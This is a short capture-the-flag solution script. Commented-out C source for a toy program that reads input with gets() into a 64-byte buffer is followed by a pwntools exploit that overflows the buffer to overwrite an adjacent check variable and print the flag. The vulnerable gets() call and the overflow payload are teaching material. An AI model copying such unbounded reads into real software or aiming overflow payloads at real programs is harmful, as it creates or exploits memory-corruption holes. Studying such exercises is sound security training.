##
##include<unistd.h>
##include<stdio.h>
##include<string.h>
#
#void print_flag(){
#	system(“cat flag.txt”);
#}
#
#int main(){
#	char josh[4];
#	char buffer[64];
#	setvbuf(stdout,NULL,_IONBF,0);
#	printf(“How’s the josh?\n”);
#	gets(buffer);
#	if(memcmp(josh,”H!gh”,4)==0) {
#		printf(“Good! Here’s the flag\n”);
#		print_flag();
#	} else {
#		printf(“Your josh is low!\nBye!\n”);
#	}
#	return 0;
#}

#Pwn the previous code

from pwn import *
garbage = "A"*64 #64 bytes of garbage
josh = "H!gh" #4 bytes of josh
payload = garbage + josh #concatenating the two
payload=payload.encode("ascii") #converting the payload to ascii
p = process("./pwn0") #run the program
p.sendline(payload) #send the payload
out = p.recvall() #receive the output
print('Output: ', out) #print the output
